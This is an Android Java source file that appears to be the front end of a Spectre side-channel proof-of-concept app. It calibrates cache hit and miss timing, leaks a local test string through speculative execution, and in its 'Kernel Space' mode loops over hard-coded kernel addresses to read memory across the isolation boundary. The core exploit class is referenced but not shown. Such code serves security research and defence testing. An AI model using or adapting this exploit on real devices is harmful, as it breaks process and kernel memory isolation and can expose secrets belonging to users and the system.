package android.spectre;

import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.os.Bundle;
import android.os.Handler;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.CompoundButton;
import android.widget.LinearLayout;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.Arrays;
import java.util.Scanner;

public class MainActivity extends AppCompatActivity {
    public static final String TAG = MainActivity.class.getSimpleName();
    public static final Object SPECTRE_MUTEX = new Object();
    private static final Handler mHandler = new Handler();

    public static final Spectre.Callback quietCallback = new Spectre.Callback() {
        @Override
        public void onByte(int offset, long pointer, byte bestGuess, int bestScore, byte secondGuess, int secondScore) {
        }
    };

    void setupCache(Spectre spectre, boolean log) {
        int[] hitTimes  = new int[11];
        int[] missTimes = new int[11];
        int cacheThreshold = spectre.calibrateTiming(1024, hitTimes, missTimes);
        if (log) {
            Log.i(TAG, "Cache hit: " + Arrays.toString(hitTimes));
            Log.i(TAG, "Cache miss: " + Arrays.toString(missTimes));
            Log.i(TAG, "Cache threshold: " + cacheThreshold);
        }
    }


    class SpectreCallback implements Spectre.Callback {
        final ProgressDialog progressDialog;
        final int readSize;
        final byte[] expectedRead;
        String dataRead = "";

        private char charFromByte(byte val) {
            return val > 31 && val < 127 ? (char) val : '�';
        }

        public SpectreCallback(ProgressDialog progressDialog, int readSize) {
            this.progressDialog = progressDialog;
            this.readSize = readSize;
            this.expectedRead = null;
        }

        public SpectreCallback(ProgressDialog progressDialog, byte[] expectedRead) {
            this.progressDialog = progressDialog;
            this.readSize = expectedRead.length;
            this.expectedRead = expectedRead;
        }

        @Override
        public void onByte(int offset, long pointer, byte bestGuess, int bestScore, byte secondGuess, int secondScore) {
            dataRead += charFromByte(bestGuess);

            String msg = String.format("ptr=0x%016x, %s, %02x => '%c', score=%d",
                    pointer,
                    bestScore >= 2 * secondScore ? ": Success" : ": Unclear",
                    bestGuess,
                    charFromByte(bestGuess),
                    bestScore);

            if (secondScore > 0) {
                msg += String.format("  --  Second guess: %02x => '%c', score=%d",
                        secondGuess,
                        charFromByte(secondGuess),
                        secondScore);
            }

            if (expectedRead != null) {
                if (bestGuess != expectedRead[offset]) {
                    msg += String.format("  --  Wrong! Should be %02x => '%c'",
                            expectedRead[offset],
                            charFromByte(expectedRead[offset]));
                } else {
                    msg += " -- Correct";
                }
            }
            Log.i(TAG, msg);
            updateProgress(progressDialog, "Reading: '" + dataRead + "'", offset+1, readSize);
            if (offset == readSize - 1) {
                mHandler.post(new Runnable() {
                    @Override
                    public void run() {
                        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
                        builder.setTitle("Data fetch complete");

                        TextView textView = new TextView(MainActivity.this);
                        textView.setText(dataRead);

                        builder.setView(textView);
                        builder.create().show();
                    }
                });
            }
        }
    }

    private void updateProgress(final ProgressDialog progressDialog, final String message, final int progress, final int maxProgress) {
        mHandler.post(new Runnable() {
            @Override
            public void run() {
                progressDialog.setTitle(message);
                progressDialog.setIndeterminate(maxProgress == 0);
                progressDialog.setMax(maxProgress);
                progressDialog.setProgress(progress);
            }
        });
    }

    void accessLocalMemory(Spectre spectre, final ProgressDialog progressDialog, final String msg) {
        try {
            updateProgress(progressDialog, "Warming up", 0, 0);
            setupCache(spectre, false);
            spectre.read("WARM-UP".getBytes(), quietCallback);
            setupCache(spectre, true);

            updateProgress(progressDialog, "Reading: ''", 0, msg.length());

            Log.i(TAG, "Using " + spectre + " to read '" + msg + "'");
            final byte[] raw_data = msg.getBytes();
            spectre.read(raw_data, new SpectreCallback(progressDialog, raw_data));
        } catch (final Exception e) {
            e.printStackTrace();
            mHandler.post(new Runnable() {
                @Override
                public void run() {
                    Toast.makeText(MainActivity.this, e.toString(), Toast.LENGTH_LONG).show();
                }
            });
        }
    }

    void accessKernelMemory(Spectre spectre, final ProgressDialog progressDialog, long ptr, int len) {
        try {
            /*setupCache(false);
            Spectre.read("WARM-UP".getBytes(), quietCallback, variant);
            setupCache(true);
            */
            Log.i(TAG, "Using " + spectre + " to read " + len + "bytes at " + String.format("0x%016x", ptr));
            spectre.read(ptr, len, new SpectreCallback(progressDialog, len));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        final Switch memorySpaceSwitch = (Switch)findViewById(R.id.sw_memory_space);
        memorySpaceSwitch.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                memorySpaceSwitch.setText(isChecked ? "Kernel Space" : "Process Space");
            }
        });
        memorySpaceSwitch.setChecked(true);
        memorySpaceSwitch.setChecked(false);

        LinearLayout layout = (LinearLayout) findViewById(R.id.root_layout);
        for (final Spectre.Variant variant : Spectre.Variant.values()) {
            final Spectre spectre = variant.build();
            Button button = new Button(this);
            button.setText(variant.description);
            layout.addView(button);

            button.setOnClickListener(new Button.OnClickListener() {
                public void onClick(View v) {
                    final ProgressDialog progressDialog = new ProgressDialog(MainActivity.this);
                    progressDialog.setTitle("Reading " + (memorySpaceSwitch.isChecked() ? "kernel" : "local") + " memory via " + variant.description);
                    progressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
                    progressDialog.setCancelable(false);
                    progressDialog.show();

                    Thread t = new Thread() {
                        @Override
                        public void run() {
                            synchronized (SPECTRE_MUTEX) {
                                if (memorySpaceSwitch.isChecked()) {
                                    for (int i=0; i<1024; i++) {
                                        if (i % 256 == 0) {
                                            setupCache(spectre, false);
                                        }
                                        accessKernelMemory(spectre, progressDialog, 0xffffffd140000000L + 157 + 0x1000000*i, 4);
                                    }
                                } else {
                                    accessLocalMemory(spectre, progressDialog, "Mary had a little lamb");
                                }

                                mHandler.post(new Runnable() {
                                    @Override
                                    public void run() {
                                        progressDialog.dismiss();
                                    }
                                });
                            }
                        }
                    };
                    t.setPriority(Thread.MAX_PRIORITY);
                    t.start();
                }
            });
        }
    }
}
